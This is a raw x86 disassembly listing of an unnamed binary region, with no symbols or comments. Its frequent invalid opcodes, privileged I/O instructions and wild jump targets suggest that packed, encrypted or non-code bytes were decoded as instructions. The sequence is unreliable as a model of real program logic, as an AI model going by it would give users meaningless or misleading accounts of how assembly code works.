  416252:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416253:	pop    ebx
  416254:	inc    eax
  416255:	cmp    eax,0xc23a0da2
  41625a:	stos   BYTE PTR es:[edi],al
  41625b:	push   ss
  41625c:	push   ebx
  41625d:	(bad)  
  41625f:	push   ss
  416260:	sbb    BYTE PTR [eax],0x72
  416263:	ret    0x2239
  416266:	dec    ecx
  416267:	ds cmp dl,dl
  41626a:	lods   eax,DWORD PTR ds:[esi]
  41626b:	xchg   esp,eax
  41626c:	out    0x63,eax
  41626e:	sahf   
  41626f:	xlat   BYTE PTR ds:[ebx]
  416270:	cli    
  416271:	cdq    
  416272:	sub    dl,dh
  416274:	gs mov dh,0x64
  416277:	mul    bh
  416279:	ja     0x4162f2
  41627b:	cmc    
  41627c:	push   eax
  41627d:	vpsadbw xmm3,xmm3,XMMWORD PTR es:[esi+eax*1]
  416283:	sub    eax,0xdc364b0e
  416288:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416289:	pop    ss
  41628a:	pop    ss
  41628b:	jg     0x4162da
  41628d:	mov    bl,0x26
  41628f:	jp     0x416282
  416291:	add    DWORD PTR [ebx+0x60],ebp
  416294:	mov    ah,ch
  416296:	rol    DWORD PTR [edx+0x8d1fea1],cl
  41629c:	mov    dh,0xaa
  41629e:	mov    al,ds:0x5f6b9ed5
  4162a3:	adc    eax,0x2838a7d9
  4162a8:	das    
  4162a9:	jno    0x4162f1
  4162ab:	and    eax,0x323d8855
  4162b0:	pop    esp
  4162b1:	hlt    
  4162b2:	int3   
  4162b3:	mov    esp,0x3eae6f8
  4162b8:	mov    edi,es
  4162ba:	lods   al,BYTE PTR ds:[esi]
  4162bb:	pop    es
  4162bc:	jp     0x416273
  4162be:	or     BYTE PTR [eax+0xc],bh
  4162c1:	pop    edx
  4162c2:	add    eax,0xad7f3a21
  4162c7:	loopne 0x416340
  4162c9:	cdq    
  4162ca:	xchg   ebx,eax
  4162cb:	jne    0x4162b7
  4162cd:	push   cs
  4162ce:	jbe    0x4162cf
  4162d0:	xchg   edx,eax
  4162d1:	shl    DWORD PTR [ebx],1
  4162d3:	sub    cl,al
  4162d5:	(bad)  
  4162d6:	outs   dx,DWORD PTR ds:[esi]
  4162d7:	push   edx
  4162d8:	ins    DWORD PTR es:[edi],dx
  4162d9:	pop    edi
  4162da:	les    ebx,FWORD PTR [ecx+esi*1+0x5a5cd8fe]
  4162e1:	jl     0x41629d
  4162e3:	(bad)  
  4162e4:	mov    al,ds:0xcb0f8eb9
  4162e9:	mov    dh,0xa3
  4162eb:	iret   
  4162ec:	stc    
  4162ed:	leave  
  4162ee:	in     al,dx
  4162ef:	neg    BYTE PTR ds:0x5940652b
  4162f5:	into   
  4162f6:	add    ecx,ecx
  4162f8:	or     ah,ah
  4162fa:	(bad)  
  4162fb:	mov    edi,0x9aba325b
  416300:	jl     0x416361
  416302:	inc    ecx
  416303:	mov    bh,0x42
  416305:	mov    ah,0x3a
  416307:	xor    dh,BYTE PTR [ebp-0x65]
  41630a:	mov    ds:0xde0d968b,al
  41630f:	add    ebp,DWORD PTR [edi-0x5d]
  416312:	fld    TBYTE PTR [esi+eax*4-0xe12c8ac]
  416319:	outs   dx,DWORD PTR ds:[esi]
  41631a:	jp     0x41633f
  41631c:	nop
  41631d:	add    BYTE PTR ds:0xf833b11d,dl
  416323:	in     al,dx
  416324:	shl    BYTE PTR [eax+ebx*4],0xd4
  416328:	fcmovb st,st(7)
  41632a:	mov    ?,WORD PTR [edi+eax*2-0x27549d81]
  416331:	xchg   ecx,eax
  416333:	fnstsw WORD PTR [ecx+0x6bfc65a2]
  416339:	pop    esi
  41633a:	inc    ebp
  41633b:	fs bsf ebx,esi
  41633f:	push   ecx
  416340:	mov    ebx,0x543243b3
  416345:	cli    
  416346:	pop    esp
  416347:	cmp    eax,0x19945977
  41634c:	arpl   ax,di
  41634e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41634f:	not    DWORD PTR [ecx+0x22272845]
  416355:	xchg   esp,eax
  416356:	xchg   esi,eax
  416357:	inc    esi
  416358:	mov    ah,0x37
  41635a:	mov    ah,0xd7
  41635c:	out    0xc,al
  41635e:	rcl    ch,cl
  416360:	or     BYTE PTR [ecx+0x40e3588a],dl
  416366:	cmp    al,0x21
  416368:	adc    BYTE PTR [esp+eiz*2],cl
  41636b:	sbb    bl,dl
  41636d:	mov    ah,0x7f
  41636f:	stos   BYTE PTR es:[edi],al
  416370:	xchg   BYTE PTR [edx+0x68c526ba],dl
  416376:	mov    ss,WORD PTR [edi]
  416378:	sub    bh,BYTE PTR [esi-0x2147a003]
  41637e:	dec    ebx
  41637f:	lods   eax,DWORD PTR ds:[esi]
  416380:	adc    DWORD PTR [edi-0x40],0x6600e16d
  416387:	dec    ebx
  416388:	push   ebx
  416389:	adc    ecx,ebp
  41638b:	rcr    DWORD PTR [edi+0x71091428],1
  416391:	ja     0x41632d
  416393:	jns    0x416409
  416395:	jne    0x416379
  416397:	mov    ah,0xfd
  416399:	imul   edx,eax,0x3a66516d
  41639f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4163a0:	sbb    dh,BYTE PTR [ecx]
  4163a2:	mov    edx,DWORD PTR [edx]
  4163a4:	jl     0x416351
  4163a6:	jge    0x416408
  4163a8:	cdq    
  4163a9:	out    dx,al
  4163aa:	mov    ds,WORD PTR [ecx-0xa]
  4163ad:	mov    ch,0xad
  4163af:	push   edi
  4163b0:	or     eax,0xa2656944
  4163b5:	and    DWORD PTR [ebp+0x47b45108],ebp
  4163bb:	add    cl,ah
  4163bd:	rcr    DWORD PTR [edx],cl
  4163bf:	stos   DWORD PTR es:[edi],eax
  4163c0:	test   eax,0x6e8d2be2
  4163c5:	fstp   QWORD PTR [esi]
  4163c7:	mov    cl,0x75
  4163c9:	aam    0x92
  4163cb:	popa   
  4163cc:	adc    dl,dh
  4163ce:	mov    ebx,0xd1216a3d
  4163d3:	ins    BYTE PTR es:[edi],dx
  4163d4:	cli    
  4163d5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4163d7:	jne    0x416438
  4163d9:	adc    DWORD PTR [ebx-0x60],esp
  4163dc:	jnp    0x41640d
  4163de:	repz int3 
  4163e0:	js     0x4163df
  4163e2:	xchg   cl,ch
  4163e4:	rcr    DWORD PTR [ecx+0x35063d08],1
  4163ea:	ins    BYTE PTR es:[edi],dx
  4163eb:	push   ss
  4163ec:	mov    al,ds:0x8097e0ac
  4163f1:	inc    esi
  4163f2:	adc    BYTE PTR [edx-0x13a39ce2],cl
  4163f8:	(bad)
  4163fb:	pop    ebx
  4163fc:	ficomp WORD PTR [edi+edx*8]
  4163ff:	push   DWORD PTR [edx+0x39fb86fb]
  416405:	jl     0x4163fa
  416407:	inc    edi
  416408:	stos   DWORD PTR es:[edi],eax
  416409:	ja     0x4163ef
  41640b:	mov    esi,DWORD PTR [ebx-0x62]
  41640e:	or     eax,DWORD PTR [ecx-0x4b]
  416411:	call   0x694b46d0
  416416:	push   esi
  416417:	jnp    0x416462
  416419:	add    edx,DWORD PTR [edx]
  41641b:	dec    eax
  41641c:	dec    edx
  41641d:	xchg   edx,eax
  41641e:	mov    esp,0xf0fa1e1
  416423:	and    DWORD PTR [eax-0x3d323e9b],ebp
  416429:	and    eax,0x4cd97065
  41642e:	cmc    
  41642f:	jge    0x41649a
  416431:	jmp    0x4163bb
  416433:	mov    bh,0xa7
  416435:	popa   
  416436:	sar    DWORD PTR [esi-0x10],cl
  416439:	jg     0x416498
  41643b:	dec    ecx
  41643c:	adc    BYTE PTR [eax+0x434f3d19],cl
  416442:	and    eax,0xaf26aa6
  416447:	cmc    
  416448:	or     DWORD PTR [eax+0x5a254c60],edi
  41644e:	lock ss stc 
  416451:	fst    QWORD PTR [edx]
  416453:	stos   BYTE PTR es:[edi],al
  416454:	cwde   
  416455:	and    eax,0x6c3155b7
  41645a:	cmp    esp,ebp
  41645c:	(bad)  
  41645e:	xchg   ch,ch
  416460:	ja     0x41640e
  416462:	(bad)  
  416463:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416464:	adc    ebp,0xd51fedb5
  41646a:	cmp    DWORD PTR [edi-0x14],esp
  41646d:	inc    eax
  41646e:	or     ch,BYTE PTR [ebp-0x7550c7db]
  416474:	hlt    
  416475:	out    dx,al
  416476:	imul   edx,DWORD PTR [esi-0x4a79865f],0x206bc773
  416480:	js     0x416446
  416482:	and    eax,0xda8ea3be
  416487:	jge    0x416426
  416489:	or     dl,al
  41648b:	popa   
  41648c:	mov    esp,0x862378ac
  416491:	pop    esi
  416492:	push   es
  416493:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416494:	stc    
  416495:	or     ebp,edi
  416497:	ret    
  416498:	dec    edx
  416499:	ins    BYTE PTR es:[edi],dx
  41649a:	or     al,cl
  41649c:	arpl   WORD PTR es:[edx-0x7283a83c],sp
  4164a3:	mov    es,WORD PTR [edx-0x52]
  4164a6:	(bad)  
  4164a7:	mov    dh,0xec
  4164a9:	scas   eax,DWORD PTR es:[edi]
  4164aa:	dec    esi
  4164ac:	test   al,0x36
  4164ae:	outs   dx,DWORD PTR ds:[esi]
  4164af:	inc    esi
  4164b0:	dec    ebp
  4164b1:	cmp    DWORD PTR [edi],edx
  4164b3:	into   
  4164b4:	mov    esi,0x7dda9b36
  4164b9:	fidiv  DWORD PTR [eax+0x24]
  4164bc:	adc    eax,0xd9584678
  4164c1:	push   esi
  4164c2:	out    dx,al
  4164c3:	pusha  
  4164c4:	adc    eax,0xc87ed152
  4164c9:	adc    eax,0x330f2cb7
  4164ce:	(bad)  
  4164cf:	cld    
  4164d0:	adc    eax,0x906657a9
  4164d5:	pop    esp
  4164d6:	(bad)  
  4164d8:	popf   
  4164d9:	hlt    
  4164da:	add    DWORD PTR [ecx],esp
  4164dc:	push   edx
  4164dd:	xchg   DWORD PTR [esi+0x2c],eax
  4164e0:	push   ebp
  4164e1:	sub    al,0x72
  4164e3:	dec    eax
  4164e4:	jmp    0x4164f4
  4164e6:	imul   ebp,eax,0x81bf5647
  4164ec:	ret    0xdb76
  4164ef:	inc    ecx
  4164f0:	pop    ebx
  4164f1:	test   edi,0xa2a39523
  4164f7:	push   edi
  4164f8:	pop    edx
  4164f9:	adc    edi,ecx
  4164fb:	dec    ecx
  4164fc:	ds mov edi,0xbe27820b
  416502:	and    eax,0x31e7b5e0
  416507:	rcl    BYTE PTR [esi-0x754e36cb],0x21
  41650e:	lods   eax,DWORD PTR ds:[esi]
  41650f:	stc    
  416510:	int3   
  416511:	jecxz  0x416589
  416513:	dec    esp
  416514:	pop    ds
  416515:	mov    al,ds:0x9a2238f3
  41651a:	jmp    0x14ff460e
  41651f:	xchg   ebx,eax
  416520:	neg    BYTE PTR [ebx-0x2a5ca222]
  416526:	inc    esi
  416527:	dec    DWORD PTR [ecx-0x325e49c3]
  41652d:	jecxz  0x4164ea
  41652f:	cmp    dh,bh
  416531:	fnstcw WORD PTR [edi+0x55]
  416534:	out    dx,eax
  416535:	push   ecx
  416536:	shr    ch,cl
  416538:	(bad)  
  416539:	les    esi,FWORD PTR [ebx]
  41653b:	xor    edx,ebp
  41653d:	call   0xbe83aa9d
  416542:	aam    0xbf
  416544:	pop    DWORD PTR [edx]
  416546:	ins    DWORD PTR es:[edi],dx
  416547:	sahf   
  416548:	adc    eax,0xc7ac43aa
  41654d:	ret    0x5626
  416550:	push   eax
  416551:	mov    dl,0x9c
  416553:	adc    DWORD PTR es:[edx],0xffffffd6
  416557:	shr    DWORD PTR [edx-0x681efc71],1
  41655d:	mov    DWORD PTR fs:[ecx],eax
  416560:	gs jbe 0x4165a6
  416563:	repz ss (bad) 
  416566:	sbb    DWORD PTR [edi-0xdf0ef2c],esi
  41656c:	mov    eax,0xff6c016
  416571:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416572:	dec    ecx
  416573:	test   eax,0xaa6a201d
  416578:	jo     0x41652a
  41657a:	loopne 0x4165d1
  41657c:	int3   
  41657d:	(bad)  
  41657e:	fbstp  TBYTE PTR [eax-0xce72abb]
  416584:	adc    al,0x9f
  416586:	js     0x416508
  416588:	or     eax,0xd2578716
  41658d:	mov    eax,edx
  41658f:	test   eax,0x5baae854
  416594:	stc    
  416595:	add    al,0xc5
  416597:	arpl   WORD PTR [ebp+0x6d],cx
  41659a:	xchg   esi,eax
  41659b:	in     eax,0x81
  41659d:	push   esi
  41659e:	adc    eax,0x57240842
  4165a3:	mov    edx,0xc8b3c285
  4165a8:	ret    0xe547
  4165ab:	jno    0x4165c5
  4165ad:	mov    eax,ds:0xcbed8da1
  4165b2:	add    dl,0xf1
  4165b5:	mov    bl,0x6a
  4165b7:	mov    edx,DWORD PTR [esi-0x52b31367]
  4165bd:	inc    edi
  4165be:	cmp    al,0xf1
  4165c0:	daa    
  4165c1:	retf   
  4165c2:	je     0x41658e
  4165c4:	dec    esp
  4165c5:	retf   
  4165c6:	push   edx
  4165c7:	imul   esi,DWORD PTR [edi-0x45],0x510b6402
  4165ce:	mov    dl,BYTE PTR [ecx+0x1b]
  4165d1:	mov    fs,WORD PTR [esi+0x2]
  4165d4:	push   edx
  4165d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4165d6:	add    eax,0x89898b84
  4165db:	mov    eax,0x958147ee
  4165e0:	or     esp,DWORD PTR [esi]
  4165e2:	jns    0x416609
  4165e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4165e5:	sub    eax,0xf33ed358
  4165ea:	and    BYTE PTR [eax+0x6f40c245],dh
  4165f0:	test   BYTE PTR [ecx-0x365d1d7e],dh
  4165f6:	repnz mov edx,0x72bffe44
  4165fc:	js     0x4165c1
  4165fe:	test   BYTE PTR [esi-0x48],al
  416601:	out    dx,al
  416602:	out    dx,al
  416603:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416604:	cdq    
  416605:	xchg   esi,eax
  416606:	inc    ebx
  416607:	xchg   ebx,ebp
  416609:	cmp    esp,DWORD PTR [edx+0x173356f7]
  41660f:	adc    al,ch
  416611:	push   cs
  416612:	xchg   esp,eax
  416613:	pusha  
  416614:	push   es
  416615:	aam    0x5f
  416617:	bound  ecx,QWORD PTR [ebx]
  416619:	xchg   ebp,eax
  41661a:	test   DWORD PTR [esi],ecx
  41661c:	pop    es
  41661d:	bound  edx,QWORD PTR [ebx-0x509e7651]
  416623:	and    DWORD PTR [edi-0x11313097],ecx
  416629:	pop    esi
  41662a:	jge    0x41660e
  41662c:	mov    edx,0x8dbcce7d
  416631:	retf   0xc271
  416634:	jmp    0x7fb7d363
  416639:	inc    ebx
  41663a:	mov    WORD PTR [ebx+ebx*2+0x4d1d366d],gs
  416641:	shl    BYTE PTR ds:0x4c97557e,1
  416647:	inc    ebx
  416648:	sub    esp,DWORD PTR [edx]
  41664a:	sub    ebx,DWORD PTR [eax+0x7cc95892]
  416650:	inc    esi
  416651:	mov    al,ds:0x81739634
  416656:	les    eax,FWORD PTR [edx]
  416658:	jmp    DWORD PTR [eax-0x5705c94d]
  41665e:	loop   0x416662
  416660:	push   esi
  416661:	cmp    al,0xf1
  416663:	push   edx
  416664:	mov    bh,BYTE PTR [esi+ecx*2]
  416667:	adc    dh,BYTE PTR [edi]
  416669:	ret    0x2ae2
  41666c:	vrcpss xmm2,xmm4,xmm3
  416670:	sub    ebx,DWORD PTR [ebx]
  416672:	je     0x416657
  416674:	pop    esi
  416675:	mov    al,0x6b
  416677:	loope  0x4166cb
  416679:	adc    eax,0x545f048
  41667e:	fld    DWORD PTR [esi+0xc98f422]
  416684:	nop
  416685:	inc    esi
  416686:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416687:	das    
  416688:	rcl    esi,1
  41668a:	out    dx,eax
  41668b:	jle    0x41668b
  41668d:	push   ebp
  41668e:	icebp  
  41668f:	in     eax,0xbe
  416691:	or     al,0x16
  416693:	pop    ebp
  416694:	(bad)  
  416695:	cli    
  416696:	iret   
  416697:	fmul   st(5),st
  416699:	pop    ss
  41669a:	test   al,0x7a
  41669c:	jge    0x4166d9
  41669e:	pop    ecx
  41669f:	mov    ebx,0xc98667cc
  4166a4:	aas    
  4166a5:	push   eax
  4166a6:	pushf  
  4166a7:	call   0x7ecd7d56
  4166ac:	lahf   
  4166ad:	mov    bh,0xfb
  4166af:	ja     0x416632
  4166b1:	push   edx
  4166b2:	jns    0x416667
  4166b4:	push   cs
  4166b5:	outs   dx,DWORD PTR ds:[esi]
  4166b6:	stos   DWORD PTR es:[edi],eax
  4166b7:	mov    ebp,0xfca68b37
  4166bc:	cmc    
  4166bd:	pop    edi
  4166be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4166bf:	leave  
  4166c0:	adc    dl,BYTE PTR [esi+0x7308ffaf]
  4166c6:	mov    ebp,0xe0c8422f
  4166cb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4166cc:	popf   
  4166cd:	mov    esp,0x79ba95fe
  4166d2:	sub    ah,bh
  4166d4:	sar    DWORD PTR [edi+0x1f4ce2f3],1
  4166da:	or     ah,BYTE PTR [esi+eax*8]
  4166dd:	lods   al,BYTE PTR ds:[esi]
  4166de:	mov    dh,0x64
  4166e0:	sub    cl,BYTE PTR [eax+0x1]
  4166e3:	jno    0x416674
  4166e5:	pop    ebx
  4166e6:	mov    eax,ds:0x85507f7b
  4166eb:	in     al,0x56
  4166ed:	mov    cs,edi
  4166ef:	xchg   esi,eax
  4166f0:	shr    edx,cl
  4166f2:	jp     0x416689
  4166f4:	push   0x4aac10f9
  4166f9:	push   esi
  4166fa:	cld    
  4166fb:	sub    eax,0xe19ae721
  416700:	sar    cl,1
  416702:	test   DWORD PTR [ecx-0x6f043992],edi
  416708:	repnz sbb al,0x9f
  41670b:	xchg   edi,eax
  41670c:	sbb    dh,bh
  41670e:	call   0xe2f9f3d8
  416713:	sub    BYTE PTR [eax+0x77],dl
  416716:	dec    ecx
  416717:	fimul  WORD PTR [eax-0x4dd81782]
  41671d:	sbb    dh,BYTE PTR [edx]
  41671f:	popa   
  416720:	out    dx,al
  416721:	pop    es
  416722:	lock or eax,0x42f5e1dc
  416728:	dec    esp
  416729:	adc    BYTE PTR [edi+0xd],dl
  41672c:	dec    esp
  41672d:	ins    BYTE PTR es:[edi],dx
  41672e:	clc    
  41672f:	int    0x5f
  416731:	push   ebx
  416732:	in     al,0xf4
  416734:	mov    DWORD PTR [ebp-0x42e8fe09],ebp
  41673a:	or     DWORD PTR [ecx-0x63],0xfbfc2f17
  416741:	inc    eax
  416742:	lahf   
  416743:	push   ebx
  416744:	mov    edx,0x77d79556
  416749:	sbb    al,0x3c
  41674b:	hlt    
  41674c:	push   0x6e
  41674e:	xchg   ebx,eax
  41674f:	jecxz  0x41674c
  416751:	loop   0x416772
  416753:	dec    ecx
  416754:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416755:	xor    esp,DWORD PTR [ecx-0x55]
  416758:	jmp    0x49dc:0x44a22959
  41675f:	mov    WORD PTR [ebp+0x121746b0],?
  416765:	pop    esi
  416766:	mov    ah,0x7d
  416768:	test   BYTE PTR [ebx+0x53],dl
  41676b:	(bad)  
  41676d:	in     al,0xc9
  41676f:	icebp  
  416770:	and    edx,0xffffffd5
  416773:	ret    0x7368
  416776:	adc    ebx,DWORD PTR [eax+0x5e]
  416779:	adc    al,0x1e
  41677c:	repz mov edi,0xafa0cdf3
  416782:	sbb    bl,BYTE PTR [ecx]
  416784:	lods   eax,DWORD PTR ds:[esi]
  416785:	pop    esp
  416786:	scas   eax,DWORD PTR es:[edi]
  416787:	out    0xdf,al
  416789:	add    edx,DWORD PTR [edx]
  41678b:	adc    BYTE PTR [edx],ch
  41678d:	or     dl,dh
  41678f:	enter  0x963e,0x62
  416793:	loopne 0x416810
  416795:	call   0xc922:0xa687b2e5
  41679c:	out    dx,eax
  41679d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41679e:	imul   edx,DWORD PTR [eax],0xea54ab99
  4167a4:	loopne 0x4167be
  4167a6:	sbb    BYTE PTR ds:0xfe9c1c27,bl
  4167ac:	xchg   edi,eax
  4167ad:	out    0xd8,al
  4167af:	pushf  
  4167b0:	xor    esp,esp
  4167b2:	std    
  4167b3:	mov    al,ds:0x268cfee5
  4167b8:	and    ecx,edx
  4167ba:	push   cs
  4167bb:	mov    esp,DWORD PTR [ecx-0xfe160ba]
  4167c1:	arpl   WORD PTR [edx-0x2a57c51e],dx
  4167c7:	pusha  
  4167c8:	imul   ebx,DWORD PTR [esi+0x208cd2fc],0x7ac9fcb1
  4167d2:	push   ebp
  4167d3:	dec    esi
  4167d4:	mov    cl,0xe2
  4167d6:	and    edi,eax
  4167d8:	dec    esp
  4167d9:	xchg   ecx,eax
  4167da:	sti    
  4167db:	mov    DWORD PTR [ebx],0x8e27a557
  4167e1:	dec    esi
  4167e2:	inc    esp
  4167e3:	inc    al
  4167e5:	inc    edx
  4167e6:	lahf   
  4167e7:	sbb    dh,BYTE PTR [eax+0x7a]
  4167ea:	xor    eax,0xad7f5091
  4167ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4167f0:	xchg   esi,eax
  4167f1:	fs ins BYTE PTR es:[edi],dx
  4167f3:	xchg   edi,eax
  4167f4:	jo     0x416870
  4167f6:	or     BYTE PTR ds:0x392e1adb,bh
  4167fc:	clc    
  4167fd:	sub    ah,BYTE PTR [eax-0x6e]
  416800:	iret   
  416801:	mov    esp,0x8dfcb27
  416806:	outs   dx,BYTE PTR ds:[esi]
  416807:	push   edi
  416808:	or     dl,0x17
  41680b:	cmp    edx,DWORD PTR [eax+0x48]
  41680e:	arpl   dx,bx
  416810:	rcr    BYTE PTR [ebx-0x6877e23a],0x3b
  416817:	aad    0xb1
  416819:	cmp    eax,DWORD PTR [ebx-0x59]
  41681c:	mov    DWORD PTR [ebx],ebx
  41681e:	outs   dx,BYTE PTR ds:[esi]
  41681f:	push   0x332c5c4c
  416824:	lock pop ecx
  416826:	sub    al,0x75
  416828:	adc    bl,ah
  41682a:	and    ah,BYTE PTR [edi]
  41682c:	aaa    
  41682d:	jns    0x416826
  41682f:	mov    ch,0xff
  416831:	out    0xd3,eax
  416833:	pop    edx
  416834:	add    edi,DWORD PTR [eax+0x72]
  416837:	or     ebp,eax
  416839:	jl     0x416888
  41683b:	push   ebx
  41683c:	cmp    DWORD PTR [edi],esp
  41683e:	adc    BYTE PTR [edi],dl
  416840:	sbb    DWORD PTR [esi-0x7],edi
  416843:	sahf   
  416844:	in     eax,dx
  416845:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416846:	mov    cl,al
  416848:	mov    cl,0xf4
  41684a:	add    esp,DWORD PTR [esi-0xb]
  41684d:	cmp    ecx,DWORD PTR [ebx]
  41684f:	or     dh,bl
  416851:	mov    edx,0x404f08fb
  416856:	inc    ecx
  416857:	adc    al,0xff
  416859:	xchg   edx,eax
  41685a:	mov    dl,0xd1
  41685c:	add    eax,0x16769c91
  416861:	jbe    0x416895
  416863:	xchg   esi,eax
  416864:	call   0xc5e308d0
  416869:	dec    ebx
  41686a:	int3   
  41686b:	pop    edx
  41686c:	aaa    
  41686d:	sbb    eax,0x874182ee
  416872:	inc    esp
  416873:	imul   ecx,DWORD PTR [ebx-0x5a],0xb8b1b84d
  41687a:	dec    ebx
  41687b:	aaa    
  41687c:	and    eax,0x37ecd858
  416881:	push   cs
  416882:	lea    edi,[esi]
  416884:	sbb    eax,0x5fe2d0ed
  416889:	(bad)  
  41688a:	loopne 0x416851
  41688c:	sbb    cl,ah
  41688e:	rcr    ebx,1
  416890:	ss inc eax
  416892:	cli    
  416893:	gs test eax,0x3af4466b
  416899:	dec    edx
  41689a:	mov    esi,0xc00ac20c
  41689f:	cmp    edi,DWORD PTR [ecx+0x463e2aa]
  4168a5:	mov    cl,BYTE PTR [ecx+0x74]
  4168a8:	int    0xe9
  4168aa:	jne    0x416848
  4168ac:	lea    ebx,[esp+edi*2-0xc2e7002]
  4168b3:	(bad)  
  4168b4:	adc    ebx,DWORD PTR [esi-0x2e10f07d]
  4168ba:	mov    al,0x77
  4168bc:	adc    al,0x4e
  4168be:	mov    dl,BYTE PTR [eax+0x62768128]
  4168c4:	ret    0x5790
  4168c7:	hlt    
  4168c8:	int3   
  4168c9:	xchg   edx,eax
  4168ca:	mov    eax,ds:0x4e84739b
  4168cf:	daa    
  4168d0:	and    DWORD PTR [esp+eiz*4+0x6248b0f0],0xc825798e
  4168db:	xchg   BYTE PTR [ecx],al
  4168dd:	jnp    0x41691a
  4168df:	int    0xc8
  4168e1:	adc    edx,DWORD PTR [ebx+esi*8+0x4a]
  4168e5:	mov    eax,0x820f0289
  4168ea:	cmp    DWORD PTR ds:0x9814ae2e,edx
  4168f0:	rcl    DWORD PTR [ebp-0xad6e48a],cl
  4168f6:	jge    0x4168c1
  4168f8:	fcom   DWORD PTR [edi+0x51f8d313]
  4168fe:	inc    eax
  4168ff:	xchg   ax,ax
  416901:	add    ah,BYTE PTR [edi+0x604828a8]
  416907:	mov    dh,0x8c
  416909:	data16 jno 0x41694a
  41690c:	mov    dh,0x14
  41690e:	lods   al,BYTE PTR ds:[esi]
  41690f:	adc    al,0x45
  416911:	lods   al,BYTE PTR ds:[esi]
  416912:	fidiv  DWORD PTR [ebp-0x79]
  416915:	push   edx
  416916:	arpl   WORD PTR [edx+0x29],sp
  416919:	cs rcr dl,cl
  41691c:	or     BYTE PTR [edi],dl
  41691e:	jne    0x41690a
  416920:	imul   edi,edx,0xffffff8f
  416923:	sbb    eax,0x4420da64
  416928:	enter  0x2e2d,0x8e
  41692c:	stc    
  41692d:	ds mov ss:0x65589a54,eax
  416934:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416935:	sub    bl,BYTE PTR [eax-0x51]
  416938:	les    eax,FWORD PTR [eax+0x4a]
  41693b:	lds    edx,FWORD PTR [ebx-0x41]
  41693e:	les    ebp,FWORD PTR [ebp+0x62151155]
  416944:	jo     0x416949
  416946:	pop    ds
  416947:	cmp    BYTE PTR [edx-0x47],cl
  41694a:	dec    edi
  41694b:	ret    0x7798
  41694e:	adc    dl,cl
  416950:	sub    BYTE PTR [ebp+0x1577f0f4],al
  416956:	dec    esi
  416957:	and    eax,0xfc456f47
  41695c:	xchg   edi,eax
  41695d:	aam    0xcb
  41695f:	jl     0x416971
  416961:	in     al,0x11
  416963:	(bad)  [edi]
  416965:	mov    dl,0x52
  416967:	mov    ds:0xc73aac9,al
  41696c:	inc    ebp
  41696d:	sub    al,0xa6
  41696f:	mov    eax,ds:0x8299e3d9
  416974:	and    eax,0x6b6fb29a
  416979:	mov    bl,0x31
  41697b:	(bad)  
  41697c:	fisub  DWORD PTR [ebp-0x5e4cd6db]
  416982:	jp     0x4169b4
  416984:	enter  0xa356,0x1c
  416988:	(bad)  
  416989:	sti    
  41698a:	(bad)  
  41698b:	push   ebx
  41698c:	push   esp
  41698d:	adc    DWORD PTR [ebx+0x32],ecx
  416990:	and    bl,BYTE PTR [edi]
  416992:	sbb    DWORD PTR [ecx],eax
  416994:	scas   eax,DWORD PTR es:[edi]
  416995:	pushf  
  416996:	dec    esp
  416997:	and    al,0x38
  416999:	jne    0x770b5be9
  41699f:	mov    eax,eax
  4169a1:	jp     0x4169b7
  4169a3:	or     ecx,DWORD PTR [ecx]
  4169a5:	and    DWORD PTR [ebx],ecx
  4169a7:	xchg   ebx,eax
  4169a8:	or     eax,edx
  4169aa:	fst    DWORD PTR [ebx-0x80]
  4169ad:	test   ebx,ebp
  4169af:	gs dec edi
  4169b1:	mov    ecx,0x25467f4a
  4169b6:	enter  0xe093,0xcf
  4169ba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4169bb:	std    
  4169bc:	(bad)  
  4169bd:	ror    DWORD PTR [edi+0x40],1
  4169c0:	into   
  4169c1:	jo     0x4169b3
  4169c3:	cmp    eax,0xddc36eb4
  4169c8:	(bad)  
  4169c9:	imul   ebp,DWORD PTR [edi-0x3752d03e],0xffffffaf
  4169d0:	push   edx
  4169d1:	bound  ebp,QWORD PTR [edx+0x75]
  4169d4:	aam    0x97
  4169d6:	jnp    0x416988
  4169d8:	(bad)  
  4169d9:	lock imul esi,DWORD PTR ds:0xd3811de1,0xffffffce
  4169e1:	jae    0x416997
  4169e3:	clc    
  4169e4:	mov    eax,0xdf5a7d48
  4169e9:	and    DWORD PTR [edx+ecx*4],ebp
  4169ec:	stc    
  4169ed:	inc    esp
  4169ee:	lahf   
  4169ef:	xchg   esi,eax
  4169f0:	(bad)  
  4169f1:	(bad)  
  4169f2:	adc    DWORD PTR [esi-0x4ab7f205],edi
  4169f8:	cmp    ebp,0x157eae76
  4169fe:	and    eax,0x10189c1c
  416a03:	inc    edx
  416a04:	xor    BYTE PTR [edx-0x2877b8b],dh
  416a0a:	es fs mov edx,0xbed2abfb
  416a11:	add    al,0xb6
  416a13:	xchg   esi,eax
  416a14:	mov    dh,0x2b
  416a16:	nop
  416a17:	cmp    BYTE PTR [eax-0x6ee93286],al
  416a1d:	into   
  416a1e:	jae    0x4169fc
  416a20:	add    DWORD PTR [ebx+0x7],ebx
  416a23:	sbb    al,0x98
  416a25:	dec    ebp
  416a26:	(bad)  
  416a27:	jge    0x416a79
  416a29:	cmp    BYTE PTR [eax],al
  416a2b:	adc    al,0x7a
  416a2d:	adc    ch,BYTE PTR [esi+0x5]
  416a30:	mov    eax,ds:0x44ffcfb2
  416a35:	sar    ah,0xa0
  416a38:	xor    DWORD PTR [edi],ebp
  416a3a:	nop
  416a3b:	push   edx
  416a3c:	loopne 0x4169e2
